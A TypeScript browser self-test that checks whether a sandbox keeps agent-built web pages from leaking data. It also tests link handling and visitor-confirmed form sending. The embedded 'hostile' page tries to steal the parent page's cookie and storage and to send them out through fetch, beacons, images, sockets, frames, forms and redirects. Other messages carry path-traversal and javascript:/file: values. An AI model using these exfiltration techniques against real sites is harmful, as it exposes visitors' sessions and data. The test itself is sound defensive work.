// The seal, proved in a real browser.   npm run seal:selftest
//
// src/lib/siteSeal.ts says what a built page may do: run its own script and nothing else. This starts a real Chrome
// and a small server that stands in for Axon, opens the REAL page a built site is shown on (src/lib/siteViewer.ts,
// with the headers the route sends) holding a page that tries everything a hostile built page would try, and counts
// what got out. Nothing may. It then shows the same hostile page two weaker ways, where it must get out: on a page
// that does not send its part of the seal, and with no seal at all. That is what proves the count can see a leak.
// Last, an ordinary two-page site is opened and used the way a visitor would: a link to another site is offered and
// not followed, a link to its own second page works, and the report panel opens.
//
// The hostile page here is exactly what the store refuses to keep (src/lib/agentSites.ts): this test goes around
// the store on purpose, because the seal has to hold even if a page the store should have refused got through.
//
// It calls no model, touches no network but this machine, and takes a few seconds. Exit code 1 if a check fails.

import { spawn } from "node:child_process";
import { mkdtempSync, rmSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import WebSocket from "ws";
import { seal, SEAL_SANDBOX } from "../src/lib/siteSeal";
import { viewerHeaders, viewerHtml } from "../src/lib/siteViewer";

const CHROME = process.env.CHROME_PATH || "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

// Axon's own policy for its ordinary pages (next.config.ts): what a frame's document inherits on a page that is not
// the viewer.
const AXON_POLICY = ["default-src 'self'", "script-src 'self' 'unsafe-inline'", "style-src 'self' 'unsafe-inline'", "img-src 'self' data: https: blob:", "font-src 'self'", "worker-src 'self' blob:", "connect-src 'self' ws: wss:", "frame-ancestors 'none'", "base-uri 'self'", "form-action 'self'"].join("; ");

// Everything a hostile built page would try. Each try is written down inside the page; the test reads it from there.
const hostile = (origin: string): string => `<!doctype html><html><head><title>hostile</title></head><body>
<form id="f1" method="post" action="${origin}/hit?what=form"><input name="a" value="1"></form>
<a id="a1" href="${origin}/hit?what=link-top" target="_top">x</a>
<script>
window.__said = {};
const attempt = (what, fn) => { try { const v = fn(); window.__said[what] = String(v === undefined ? "ran" : v).slice(0, 200); } catch (e) { window.__said[what] = "refused: " + e.name; } };
attempt("read the page's cookie", () => parent.document.cookie);
attempt("read the page's storage", () => parent.localStorage.getItem("signin"));
attempt("read its own cookie", () => document.cookie || "(empty)");
attempt("read its own storage", () => localStorage.getItem("signin"));
attempt("fetch", () => { fetch("${origin}/hit?what=fetch").catch(() => {}); });
attempt("fetch, no-cors", () => { fetch("${origin}/hit?what=fetch-nocors", { mode: "no-cors" }).catch(() => {}); });
attempt("the report route, as the visitor", () => { fetch("${origin}/api/sites/x/report", { method: "POST", body: "{}" }).catch(() => {}); });
attempt("xhr", () => { const x = new XMLHttpRequest(); x.open("GET", "${origin}/hit?what=xhr"); x.send(); });
attempt("beacon", () => navigator.sendBeacon("${origin}/hit?what=beacon", "d"));
attempt("picture", () => { new Image().src = "${origin}/hit?what=img"; });
attempt("socket", () => { new WebSocket("${origin.replace("http", "ws")}/hit?what=socket"); });
attempt("event source", () => { new EventSource("${origin}/hit?what=eventsource"); });
attempt("script from outside", () => { const s = document.createElement("script"); s.src = "${origin}/hit?what=script"; document.head.appendChild(s); });
attempt("style from outside", () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = "${origin}/hit?what=css"; document.head.appendChild(l); });
attempt("frame", () => { const i = document.createElement("iframe"); i.src = "${origin}/hit?what=frame"; document.body.appendChild(i); });
attempt("open a window", () => { const w = window.open("${origin}/hit?what=open"); return w ? "opened" : "no window"; });
attempt("click a link to the top", () => { document.getElementById("a1").click(); });
attempt("move the page", () => { top.location = "${origin}/hit?what=top"; });
window.__said.done = "done";
// last, because these would take the frame itself somewhere else, with whatever it wants to carry in the address
setTimeout(() => { try { document.getElementById("f1").submit(); } catch (e) {} }, 1700);
setTimeout(() => { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=${origin}/hit?what=refresh"; document.head.appendChild(m); }, 2000);
setTimeout(() => { try { location.href = "${origin}/hit?what=move-itself"; } catch (e) {} }, 2600);
</script></body></html>`;

const ORDINARY = {
  "index.html": `<!doctype html><html><body><h1 id="h">HOME</h1><a id="ext" href="https://example.com/docs/start">Docs</a> <a id="in" href="about.html">About</a> <a id="top" href="#h">Top</a></body></html>`,
  "about.html": `<!doctype html><html><body><h1 id="h">ABOUT</h1><a id="back" href="index.html">Back</a></body></html>`,
};

// A page with a form, as an agent would build it: named fields, a submit button, and a thank-you of its own.
const FORM = {
  "index.html": `<!doctype html><html><body><h1 id="h">RSVP</h1>
<form id="calc"><input name="Bill" id="bill" value="84"><button id="cgo">Work it out</button></form>
<form data-collect name="rsvp" id="fm"><label>Name <input name="Name" id="nm" required></label><label>Coming <select name="Coming" id="cm"><option>Yes</option><option>No</option></select></label><label>Note <textarea name="Note" id="nt"></textarea></label><input type="file" name="Photo"><button id="go">Send</button></form>
<p id="thanks" data-after-send hidden>THANKS</p>
<script>window.__events = []; document.getElementById("fm").addEventListener("axon:sent", () => window.__events.push("sent")); document.getElementById("fm").addEventListener("axon:notsent", (e) => window.__events.push("notsent:" + e.detail.why));</script></body></html>`,
};

type Mode = "viewer" | "bare" | "open" | "use" | "form";
interface Run { hits: string[]; said: Record<string, string>; href: string; holder: Record<string, unknown>; posted: unknown[] }

interface Cdp { send(method: string, params?: object, sessionId?: string): Promise<Record<string, unknown>>; close(): void; contexts: { id: number; frameId?: string; sessionId?: string }[]; mainFrame: string }

async function connect(port: number): Promise<Cdp> {
  let target: { webSocketDebuggerUrl: string } | undefined;
  for (let i = 0; i < 100 && !target; i++) {
    try { target = ((await (await fetch(`http://127.0.0.1:${port}/json`)).json()) as { type: string; webSocketDebuggerUrl: string }[]).find((t) => t.type === "page"); } catch { await sleep(150); }
  }
  if (!target) throw new Error(`Chrome did not start (${CHROME}). Set CHROME_PATH to a Chrome or Chromium.`);
  const ws = new WebSocket(target.webSocketDebuggerUrl);
  await new Promise((r) => ws.on("open", r));
  let id = 0;
  const waiting = new Map<number, (v: Record<string, unknown>) => void>();
  const cdp: Cdp = {
    contexts: [], mainFrame: "",
    send: (method, params = {}, sessionId) => new Promise((r) => { const n = ++id; waiting.set(n, r); ws.send(JSON.stringify({ id: n, method, params, ...(sessionId ? { sessionId } : {}) })); }),
    close: () => ws.close(),
  };
  ws.on("message", (m) => {
    const x = JSON.parse(String(m)) as { id?: number; method?: string; params?: Record<string, unknown>; sessionId?: string; result?: Record<string, unknown> };
    if (x.id && waiting.has(x.id)) { waiting.get(x.id)!(x.result ?? {}); waiting.delete(x.id); return; }
    if (x.method === "Runtime.executionContextDestroyed") cdp.contexts = cdp.contexts.filter((c) => !(c.id === (x.params as { executionContextId: number }).executionContextId && c.sessionId === x.sessionId));
    if (x.method === "Runtime.executionContextsCleared") cdp.contexts = cdp.contexts.filter((c) => c.sessionId !== x.sessionId);
    if (x.method === "Runtime.executionContextCreated") {
      const c = x.params!.context as { id: number; auxData?: { frameId?: string; isDefault?: boolean } };
      if (c.auxData?.isDefault !== false) cdp.contexts.push({ id: c.id, frameId: c.auxData?.frameId, sessionId: x.sessionId });
    }
    // a frame Chrome put in a process of its own: follow it there
    if (x.method === "Target.attachedToTarget") void cdp.send("Runtime.enable", {}, (x.params as { sessionId: string }).sessionId);
  });
  await cdp.send("Target.setAutoAttach", { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
  await cdp.send("Page.enable");
  await cdp.send("Runtime.enable");
  return cdp;
}

async function run(mode: Mode): Promise<Run> {
  const hits: string[] = [];
  const posted: unknown[] = [];
  let pages: Record<string, string> = {};
  const server = createServer((req, res) => {
    const url = new URL(req.url ?? "/", "http://x");
    // where the viewer page sends a form's answers: what arrives is kept, to be counted
    if (url.pathname === "/api/sites/x/answers" && req.method === "POST") {
      let body = "";
      req.on("data", (c) => { body += c; });
      req.on("end", () => { try { posted.push(JSON.parse(body)); } catch { posted.push(body); } res.writeHead(200, { "content-type": "application/json" }); res.end(JSON.stringify({ ok: true })); });
      return;
    }
    if (url.pathname === "/hit" || url.pathname.startsWith("/api/")) {
      hits.push(url.pathname === "/hit" ? (url.searchParams.get("what") ?? "?") : "the report route");
      res.writeHead(200, { "content-type": "text/plain", "access-control-allow-origin": "*" });
      return res.end("ok");
    }
    if (url.pathname !== "/") { res.writeHead(404); return res.end(); }
    const cookie = { "set-cookie": "signin=PARENT-COOKIE; Path=/" };
    if (mode === "viewer" || mode === "use" || mode === "form") {
      // the real page, with the headers the route sends
      res.writeHead(200, { ...viewerHeaders(), ...cookie });
      return res.end(viewerHtml({ siteId: "x", title: "Self test", agentId: "tester" }, pages, "Test agent", undefined, mode === "form" ? { answers: true, version: 1 } : {}));
    }
    // an ordinary page of Axon's holding the same frame: with the document sealed ("bare") or not at all ("open")
    res.writeHead(200, { "content-type": "text/html; charset=utf-8", "content-security-policy": AXON_POLICY, ...cookie });
    res.end(`<!doctype html><html><body><iframe id="f"></iframe><script>
localStorage.setItem("signin", "PARENT-STORAGE");
const f = document.getElementById("f");
f.setAttribute("sandbox", ${JSON.stringify(mode === "bare" ? SEAL_SANDBOX : "allow-scripts allow-same-origin allow-forms allow-popups")});
f.srcdoc = ${JSON.stringify(pages["index.html"]).replace(/</g, "\\u003c")};
</script></body></html>`);
  });
  server.on("upgrade", (req, socket) => { hits.push(new URL(req.url ?? "/", "http://x").searchParams.get("what") ?? "socket"); socket.destroy(); });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  const origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  pages = mode === "use" || mode === "form" ? Object.fromEntries(Object.entries(mode === "form" ? FORM : ORDINARY).map(([k, v]) => [k, seal(v)])) : { "index.html": mode === "open" ? hostile(origin) : seal(hostile(origin)) };

  const profile = mkdtempSync(join(tmpdir(), "seal-selftest-"));
  const port = 9300 + Math.floor(Math.random() * 500);
  const chrome = spawn(CHROME, ["--headless=new", `--remote-debugging-port=${port}`, `--user-data-dir=${profile}`, "--no-first-run", "--no-default-browser-check", "about:blank"], { stdio: "ignore" });
  try {
    const cdp = await connect(port);
    const value = async (expression: string, c?: { id: number; sessionId?: string }) =>
      ((await cdp.send("Runtime.evaluate", { expression, returnByValue: true, ...(c && !c.sessionId ? { contextId: c.id } : {}) }, c?.sessionId)).result as { value?: unknown } | undefined)?.value;
    await cdp.send("Page.navigate", { url: `${origin}/` });
    await sleep(1200);
    cdp.mainFrame = ((await cdp.send("Page.getFrameTree")).frameTree as { frame: { id: string } }).frame.id;
    // the newest context that is not the page's own: the frame's document as it now is
    const inFrame = async (expression: string) => {
      for (const c of [...cdp.contexts].reverse().filter((x) => x.sessionId || (x.frameId && x.frameId !== cdp.mainFrame))) {
        const v = await value(expression, c);
        if (v !== undefined) return v;
      }
      return undefined;
    };
    const holder: Record<string, unknown> = {};
    let said: Record<string, string> = {};
    if (mode === "use") {
      const strip = () => value(`JSON.stringify({ shown: !document.getElementById("o").hidden, where: document.getElementById("ow").textContent })`).then((v) => JSON.parse(String(v)) as { shown: boolean; where: string });
      holder.first = await inFrame(`document.getElementById("h").textContent`);
      await inFrame(`document.getElementById("top").click()`);
      await sleep(300);
      holder.afterPlaceLink = (await strip()).shown ? "asked" : await inFrame(`document.getElementById("h").textContent`);
      await inFrame(`document.getElementById("ext").click()`);
      await sleep(400);
      holder.asked = await strip();
      await value(`document.getElementById("on").click()`);
      holder.afterStay = (await strip()).shown;
      await inFrame(`document.getElementById("in").click()`);
      await sleep(700);
      holder.second = await inFrame(`document.getElementById("h").textContent`);
      await inFrame(`document.getElementById("back").click()`);
      await sleep(700);
      holder.back = await inFrame(`document.getElementById("h").textContent`);
      // a built page asking for something that is not a page of the site, or not an address, is ignored
      await inFrame(`parent.postMessage({ axon: "go", page: "../../etc/passwd" }, "*"); parent.postMessage({ axon: "open", url: "javascript:alert(1)" }, "*"); parent.postMessage({ axon: "open", url: "file:///etc/passwd" }, "*")`);
      await sleep(300);
      holder.afterNonsense = { shown: (await strip()).shown, page: await inFrame(`document.getElementById("h").textContent`) };
      await value(`document.getElementById("rb").click()`);
      holder.reportOpen = await value(`!document.getElementById("r").hidden`);
      holder.windows = ((await cdp.send("Target.getTargets")).targetInfos as { type: string }[]).filter((t) => t.type === "page").length;
    } else if (mode === "form") {
      const strip = () => value(`JSON.stringify({ shown: !document.getElementById("s").hidden, text: document.getElementById("sl").textContent })`).then((v) => JSON.parse(String(v)) as { shown: boolean; text: string });
      const frame = () => inFrame(`JSON.stringify({ busy: !!document.getElementById("fm").getAttribute("aria-busy"), formHidden: document.getElementById("fm").hidden, thanks: !document.getElementById("thanks").hidden, name: document.getElementById("nm").value, said: (document.querySelector("[data-axon-said]") || {}).textContent || "", events: window.__events })`).then((v) => JSON.parse(String(v)) as { busy: boolean; formHidden: boolean; thanks: boolean; name: string; said: string; events: string[] });
      // a form that is not marked as collecting answers is the page's own: its button asks the visitor nothing
      await inFrame(`document.getElementById("cgo").click()`);
      await sleep(400);
      holder.unmarked = { strip: (await strip()).shown, posted: posted.length, hits: hits.length };
      // a form with a required field left empty is stopped by its own check, and nothing is asked
      await inFrame(`document.getElementById("go").click()`);
      await sleep(500);
      holder.empty = { strip: (await strip()).shown, frame: await frame(), posted: posted.length };
      // the visitor fills it in and presses its button
      await inFrame(`document.getElementById("nm").value = "Ada Lovelace"; document.getElementById("nt").value = "Two of us.\\nNo nuts."; document.getElementById("go").click()`);
      await sleep(500);
      holder.asked = { strip: await strip(), frame: await frame(), posted: posted.length };
      // they say no: nothing goes, and the form is theirs again
      await value(`document.getElementById("sn").click()`);
      await sleep(300);
      holder.cancelled = { strip: (await strip()).shown, frame: await frame(), posted: posted.length };
      await sleep(1400);
      // the page itself asks, over and over, with words the visitor never typed: the holder asks the visitor, and
      // sends nothing until they answer
      await inFrame(`for (let i = 0; i < 6; i++) parent.postMessage({ axon: "form", id: 900 + i, form: "rsvp", fields: [["Name", "not the visitor " + i]] }, "*"); try { document.getElementById("fm").submit(); } catch (e) {}`);
      await sleep(600);
      holder.byItself = { strip: await strip(), posted: posted.length, hits: hits.length };
      await value(`document.getElementById("sn").click()`);
      await sleep(1700);
      // again, and this time they say yes
      await inFrame(`document.getElementById("go").click()`);
      await sleep(500);
      await value(`document.getElementById("sy").click()`);
      await sleep(900);
      holder.sent = { strip: (await strip()).shown, frame: await frame(), posted: posted.length };
    } else {
      // without the seal the hostile page can open a window of its own, which is one more place to look: the page that
      // wrote something down is the one that is read
      for (const c of cdp.contexts.filter((x) => x.sessionId || (x.frameId && x.frameId !== cdp.mainFrame))) {
        const got = JSON.parse(String((await value("JSON.stringify(window.__said || {})", c)) ?? "{}")) as Record<string, string>;
        if (Object.keys(got).length > Object.keys(said).length) said = got;
      }
      await sleep(2800); // the two tries to leave come after
    }
    const href = String(await value("location.href"));
    cdp.close();
    return { hits: [...new Set(hits)].sort(), said, href: href.replace(origin, ""), holder, posted };
  } finally {
    chrome.kill();
    server.close();
    await sleep(300);
    rmSync(profile, { recursive: true, force: true });
  }
}

const checks: { name: string; ok: boolean; detail?: string }[] = [];
const check = (name: string, ok: boolean, detail?: string) => { checks.push({ name, ok, detail }); console.log(`${ok ? "  ok  " : "  FAIL"} ${name}${detail ? `  (${detail})` : ""}`); };

async function main(): Promise<void> {
  const inside = await run("viewer");
  console.log("\nA hostile page on the real viewer page:");
  check("the hostile page ran (the seal lets a built page run its own script)", inside.said.done === "done");
  check("nothing it tried reached a server: no request, no socket, no form, no window, not even by sending itself away", inside.hits.length === 0, inside.hits.length ? `got out: ${inside.hits.join(", ")}` : "0 requests");
  check("it could not read the page's cookie", !String(inside.said["read the page's cookie"]).includes("PARENT"), inside.said["read the page's cookie"]);
  check("it could not read the page's storage", !String(inside.said["read the page's storage"]).includes("PARENT"), inside.said["read the page's storage"]);
  check("its own cookie and storage are not the visitor's", !String(inside.said["read its own cookie"]).includes("PARENT") && !String(inside.said["read its own storage"]).includes("PARENT"), `${inside.said["read its own cookie"]} / ${inside.said["read its own storage"]}`);
  check("it could not move the page around it", inside.href === "/", inside.href);
  check("it could not open a window", inside.said["open a window"] !== "opened", inside.said["open a window"]);

  const halfway = await run("bare");
  console.log("\nSealed, but on an ordinary page that does not send its part of the seal:");
  check("the frame can then send itself somewhere else (which is why a built page is only shown on the viewer page)", halfway.hits.includes("refresh") || halfway.hits.includes("move-itself"), halfway.hits.join(", ") || "nothing got out");

  const outside = await run("open");
  console.log("\nThe same page with no seal (it must get out, or the count above proves nothing):");
  check("without the seal it reads the visitor's cookie and storage", String(outside.said["read the page's cookie"]).includes("PARENT-COOKIE") && String(outside.said["read the page's storage"]).includes("PARENT-STORAGE"));
  check("without the seal its requests arrive", ["fetch", "img", "xhr"].every((w) => outside.hits.includes(w)), outside.hits.join(", "));

  const used = await run("use");
  const h = used.holder as { first: string; afterPlaceLink: string; asked: { shown: boolean; where: string }; afterStay: boolean; second: string; back: string; afterNonsense: { shown: boolean; page: string }; reportOpen: boolean; windows: number };
  console.log("\nAn ordinary two-page site, used as a visitor would:");
  check("it opens on its first page", h.first === "HOME", String(h.first));
  check("a link to a place on the same page is left alone", h.afterPlaceLink === "HOME", String(h.afterPlaceLink));
  check("a link to another site is offered to the visitor with its address, not followed", h.asked.shown && h.asked.where === "example.com/docs/start" && used.hits.length === 0 && h.windows === 1, `${h.asked.where}, ${h.windows} window`);
  check("saying no closes the offer", h.afterStay === false);
  check("a link to the site's second page goes there, and back", h.second === "ABOUT" && h.back === "HOME", `${h.second}, ${h.back}`);
  check("asking for a page outside the site, or an address that is not a web address, does nothing", h.afterNonsense.shown === false && h.afterNonsense.page === "HOME");
  check("the report panel opens", h.reportOpen === true);
  check("the page never left its address", used.href === "/", used.href);

  const formed = await run("form");
  type FrameSaid = { busy: boolean; formHidden: boolean; thanks: boolean; name: string; said: string; events: string[] };
  const f = formed.holder as { unmarked: { strip: boolean; posted: number; hits: number }; empty: { strip: boolean; frame: FrameSaid; posted: number }; asked: { strip: { shown: boolean; text: string }; frame: FrameSaid; posted: number }; cancelled: { strip: boolean; frame: FrameSaid; posted: number }; byItself: { strip: { shown: boolean; text: string }; posted: number; hits: number }; sent: { strip: boolean; frame: FrameSaid; posted: number } };
  const got = formed.posted[0] as { form?: string; fields?: [string, string][]; v?: number } | undefined;
  console.log("\nA page with a form, filled in and sent as a visitor would:");
  check("a form that is not marked as collecting answers is left to the page: nothing is asked and nothing goes", f.unmarked.strip === false && f.unmarked.posted === 0 && f.unmarked.hits === 0);
  check("a form with a required field left empty is stopped by its own check: nothing is asked", f.empty.strip === false && f.empty.posted === 0 && f.empty.frame.busy === false, JSON.stringify(f.empty.frame));
  check("a filled form is shown to the visitor before anything goes: what they typed, and nothing sent yet", f.asked.strip.shown && f.asked.strip.text.includes("Name: Ada Lovelace") && f.asked.strip.text.includes("Coming: Yes") && f.asked.posted === 0 && f.asked.frame.busy, f.asked.strip.text);
  check("saying no sends nothing and gives the form back as it was", f.cancelled.strip === false && f.cancelled.posted === 0 && f.cancelled.frame.busy === false && f.cancelled.frame.name === "Ada Lovelace" && !f.cancelled.frame.thanks);
  check("a page that asks by itself, again and again, gets one question put to the visitor and nothing sent", f.byItself.posted === 0 && f.byItself.hits === 0 && f.byItself.strip.shown && f.byItself.strip.text.includes("not the visitor 0") && !f.byItself.strip.text.includes("not the visitor 1"), f.byItself.strip.text);
  check("saying yes sends exactly what was shown, once, with the form's name and the page's version", formed.posted.length === 1 && got?.form === "rsvp" && got?.v === 1 && JSON.stringify(got?.fields) === JSON.stringify([["Name", "Ada Lovelace"], ["Coming", "Yes"], ["Note", "Two of us.\nNo nuts."]]), JSON.stringify(formed.posted).slice(0, 200));
  check("a file is never sent", !JSON.stringify(formed.posted).includes("Photo"));
  check("the page is told it was sent, and shows its own thank-you in place of the form", f.sent.frame.events.includes("sent") && f.sent.frame.thanks && f.sent.frame.formHidden && f.sent.strip === false, JSON.stringify(f.sent.frame));
  check("the form went nowhere by itself: the only request was the one the visitor allowed", formed.hits.length === 0 && formed.href === "/", `${formed.hits.join(", ")} ${formed.href}`);

  const failed = checks.filter((c) => !c.ok);
  console.log(`\n${checks.length - failed.length} of ${checks.length} checks passed${failed.length ? `. FAILED: ${failed.map((c) => c.name).join("; ")}` : "."}`);
  process.exit(failed.length ? 1 : 0);
}

main().catch((e) => { console.error(e instanceof Error ? e.message : e); process.exit(1); });
